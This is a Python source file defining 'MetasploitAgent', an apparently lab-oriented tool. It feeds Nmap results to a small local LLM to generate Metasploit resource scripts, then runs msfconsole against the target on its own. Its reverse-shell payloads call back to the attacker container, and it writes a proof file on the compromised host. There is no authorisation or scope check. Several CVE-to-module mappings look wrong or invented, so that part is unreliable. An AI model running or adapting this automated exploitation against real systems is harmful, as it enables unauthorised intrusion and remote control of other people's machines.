import json
import os
import socket
import subprocess
import requests
from typing import Dict, List
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from agno.tools.toolkit import Toolkit
from agno.utils.log import logger

import logging

# Configuración de logging
logger.setLevel(logging.DEBUG)
results_dir = "/results"
os.makedirs(results_dir, exist_ok=True)
log_file = "/results/combined.log"
file_handler = logging.FileHandler(log_file)
file_handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s [%(name)s] %(levelname)s: %(message)s')
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

class MetasploitAgent(Toolkit):
    def __init__(self):
        super().__init__(name="MetasploitAgent")
        self.register(self.run)
        self.ollama_url = "http://ollama:11434/api/generate"
        self.model = "llama3.2:1b"
        self.results_dir = "/results"
        self.lhost = self._get_container_ip()
        self.lport = 4444

    def _get_container_ip(self) -> str:
        """Obtiene la IP del contenedor actual."""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            logger.info(f"IP del contenedor detectada: {ip}")
            return ip
        except Exception as e:
            logger.warning(f"No se pudo obtener la IP dinámica: {e}, usando fallback 172.18.0.4")
            return "172.18.0.4"

    def get_payload(self, os_info: str) -> str:
        """Elige un payload según el OS detectado o el servicio."""
        os_info = os_info.lower()
        if "windows" in os_info:
            return "windows/meterpreter/reverse_tcp"
        elif "linux" in os_info or "unix" in os_info or "debian" in os_info:
            return "cmd/unix/reverse"
        else:
            logger.warning(f"OS desconocido: {os_info}, seleccionando payload según servicio")
            return "cmd/unix/reverse" if "http" in self.name.lower() else "generic/shell_reverse_tcp"

    def generate_exploit_llm(self, ip: str, port: str, service: str, os_info: str, vuln_id: str = None,
                            vulners: List[Dict] = None) -> str | None:
        """Genera un script de Metasploit usando el LLM con instrucciones condicionales."""
        vuln_prompt = f" para la vulnerabilidad {vuln_id}" if vuln_id else ""
        vulners_info = f"Vulnerabilidades detectadas: {json.dumps(vulners)}" if vulners else "Sin vulnerabilidades específicas detectadas."
        payload = self.get_payload(os_info)
        file_cmd = "echo" if "unix" in payload or "linux" in payload else "echo."
        file_path = f"/tmp/exploit_{vuln_id or 'generic'}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        prompt = f"""
        Genera un script de Metasploit (.rc) para explotar un servicio {service} en {ip}:{port}{vuln_prompt} en un sistema {os_info}.
        {vulners_info}
        Usa un exploit conocido de Metasploit basado en la información proporcionada. Sigue estas instrucciones:
        - Si el servicio es HTTP y el sistema es Linux, considera exploits como 'multi/http/apache_mod_cgi_bash_env_exec' o 'multi/http/php_cgi_arg_injection'.
        - Si hay vulnerabilidades específicas (CVEs), elige un exploit relacionado (e.g., 'multi/http/dvwa_login_bypass' para DVWA).
        - Si no hay coincidencias claras, usa un exploit genérico como 'multi/handler'.
        - Incluye 'set TARGETURI' si el exploit lo requiere (e.g., '/cgi-bin/' para Apache CGI, '/' para otros).
        - Configura:
          - set RHOSTS {ip}
          - set RPORT {port}
          - set PAYLOAD {payload}
          - set LHOST {self.lhost}
          - set LPORT {self.lport}
          - exploit
        - Post-explotación: crea un archivo '{file_path}' con 'Exploited by Metasploit' usando '{file_cmd}'.
        - Termina con 'exit'.
        Devuelve solo el script.
        """

        try:
            session = requests.Session()
            retries = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
            session.mount("http://", HTTPAdapter(max_retries=retries))
            response = session.post(
                self.ollama_url,
                json={"model": self.model, "prompt": prompt, "stream": False},
                timeout=120
            )
            response.raise_for_status()
            script = response.json().get("response", "").strip()
            if "use " in script and "exploit" in script:
                logger.debug(f"Script LLM generado para {vuln_id or 'generic'}: {script}")
                return script
            logger.warning(f"Script LLM inválido para {vuln_id or 'generic'}, usando fallback")
        except Exception as e:
            logger.error(f"Error con LLM para {vuln_id or 'generic'}: {e}")

        script = f"""
use multi/handler
set RHOSTS {ip}
set RPORT {port}
set PAYLOAD {payload}
set LHOST {self.lhost}
set LPORT {self.lport}
exploit
{file_cmd} 'Exploited by Metasploit' > {file_path}
exit
"""
        logger.info(f"Usando script de respaldo genérico")
        return script

    def generate_exploit_vulners(self, ip: str, port: str, service: str, os_info: str, vulners: List[Dict]) -> List[str]:
        """Genera scripts basados en vulners del JSON de Nmap."""
        scripts = []
        cve_to_exploit = {
            "CVE-2021-40438": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
            "CVE-2023-25690": "exploit/multi/http/apache_requisition",
            "CVE-2022-22720": "exploit/multi/http/apache_http_server_rce"
        }

        for vuln in vulners:
            vuln_id = vuln.get("id", "unknown")
            if vuln.get("exploit", False):
                exploit = cve_to_exploit.get(vuln_id)
                if exploit:
                    payload = self.get_payload(os_info)
                    file_cmd = "echo" if "unix" in payload or "linux" in payload else "echo."
                    file_path = f"/tmp/exploit_{vuln_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    script = f"""
use {exploit}
set RHOSTS {ip}
set RPORT {port}
set PAYLOAD {payload}
set LHOST {self.lhost}
set LPORT {self.lport}
exploit
{file_cmd} 'Exploited by Metasploit' > {file_path}
exit
"""
                    logger.info(f"[+] Script generado para {vuln_id} con exploit {exploit}")
                    scripts.append({"script": script, "source": f"vulners_{vuln_id}", "exploit": exploit})
                else:
                    script = self.generate_exploit_llm(ip, port, service, os_info, vuln_id)
                    if script:
                        scripts.append({"script": script, "source": f"llm_{vuln_id}", "exploit": "unknown"})
        return scripts

    def run(self, **kwargs) -> Dict[str, str]:
        json_file = kwargs.get('json_file', '/results/nmap_result.json')
        timeout = kwargs.get('timeout', 600)

        if not os.path.exists(json_file):
            logger.error(f"No se encontró {json_file}")
            return {"error": f"No se encontró {json_file}"}

        try:
            with open(json_file, 'r') as f:
                nmap_data = json.load(f)
        except json.JSONDecodeError:
            logger.error(f"Error al decodificar {json_file}")
            return {"error": f"Error al decodificar {json_file}"}

        target_data = nmap_data.get("target", {})
        ip = target_data.get("ip")
        port = target_data.get("port")
        service = target_data.get("service")
        os_info = target_data.get("os", "unknown")
        vulners = nmap_data.get("tools", {}).get("metasploit", {}).get("vulners", [])

        if not all([ip, port, service]):
            logger.warning("Datos incompletos en 'target' para Metasploit")
            return {"warning": "Datos incompletos en 'target' para Metasploit"}

        target = f"{ip} {port} {service}"
        results = {}

        # Generar scripts: solo con LLM y vulners
        scripts = []
        # Script genérico con LLM
        scripts.append({"script": self.generate_exploit_llm(ip, port, service, os_info, None, vulners), "source": "llm_generic", "exploit": "unknown"})
        # Scripts por vulnerabilidad con LLM
        for vuln in vulners[:3]:
            script = self.generate_exploit_llm(ip, port, service, os_info, vuln.get("id"), vulners)
            if script:
                scripts.append({"script": script, "source": f"llm_{vuln.get('id')}", "exploit": "unknown"})
        # Scripts basados en vulners
        vulners_scripts = self.generate_exploit_vulners(ip, port, service, os_info, vulners)
        scripts.extend(vulners_scripts)

        if not scripts:
            logger.warning("No se generaron scripts de exploit")
            results[target] = "Error: No se generaron scripts de exploit"
            return results

        # Ejecutar scripts
        for idx, script_info in enumerate(scripts):
            script = script_info["script"]
            source = script_info["source"]
            exploit_name = script_info.get("exploit", "unknown")

            try:
                logger.info(f"Probando exploit {idx + 1}/{len(scripts)} para {target} (OS: {os_info}, Source: {source}, Exploit: {exploit_name})...")
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                script_path = f"{self.results_dir}/exploit_{ip}_{port}_{source}_{timestamp}.rc"
                with open(script_path, "w") as f:
                    f.write(script)
                logger.debug(f"Script guardado: {script_path}")

                command = ["/usr/bin/msfconsole", "-q", "-r", script_path]
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate(timeout=timeout)

                output_path = f"{self.results_dir}/output_{ip}_{port}_{source}_{timestamp}.txt"
                with open(output_path, "w") as f:
                    f.write(stdout + "\n" + stderr)
                logger.info(f"Salida guardada en {output_path}")

                if process.returncode == 0 and "Exploit completed" in stdout:
                    file_path = next((line.split("> ")[1] for line in script.split("\n") if "> " in line), "unknown")
                    logger.info(f"Exploit {idx + 1} ejecutado con éxito en {target} (Source: {source})")
                    results[f"{target}_exploit_{idx}"] = {
                        "status": "success",
                        "source": source,
                        "exploit": exploit_name,
                        "file_created": file_path,
                        "output": output_path
                    }
                else:
                    logger.error(f"Error en exploit {idx + 1} para {target} (Source: {source}): {stderr or 'Sin detalles'}")
                    results[f"{target}_exploit_{idx}"] = {
                        "status": "failed",
                        "source": source,
                        "exploit": exploit_name,
                        "error": stderr or "Sin detalles",
                        "output": output_path
                    }

                self.lport += 1
            except Exception as e:
                logger.error(f"Error en exploit {idx + 1} para {target} (Source: {source}): {e}")
                results[f"{target}_exploit_{idx}"] = {
                    "status": "failed",
                    "source": source,
                    "exploit": exploit_name,
                    "error": str(e),
                    "output": "N/A"
                }

        # Resumen de resultados
        logger.info("=== Resumen de Explotación ===")
        successful_exploits = []
        failed_exploits = []

        for key, result in results.items():
            if isinstance(result, dict) and "status" in result:
                if result["status"] == "success":
                    successful_exploits.append({
                        "target": key,
                        "source": result["source"],
                        "exploit": result["exploit"],
                        "file_created": result["file_created"],
                        "output": result["output"]
                    })
                else:
                    failed_exploits.append({
                        "target": key,
                        "source": result["source"],
                        "exploit": result["exploit"],
                        "error": result["error"],
                        "output": result["output"]
                    })

        logger.info("Exploits Exitosos:")
        if successful_exploits:
            for exploit in successful_exploits:
                logger.info(f"- Target: {exploit['target']}, Source: {exploit['source']}, Exploit: {exploit['exploit']}, "
                            f"Archivo Creado: {exploit['file_created']}, Salida: {exploit['output']}")
        else:
            logger.info("Ningún exploit fue exitoso.")

        logger.info("Exploits Fallidos:")
        if failed_exploits:
            for exploit in failed_exploits:
                logger.info(f"- Target: {exploit['target']}, Source: {exploit['source']}, Exploit: {exploit['exploit']}, "
                            f"Error: {exploit['error']}, Salida: {exploit['output']}")
        else:
            logger.info("Ningún exploit falló.")
        logger.info("=============================")

        return results

if __name__ == "__main__":
    agent = MetasploitAgent()
    result = agent.run()
    print(json.dumps(result, indent=2))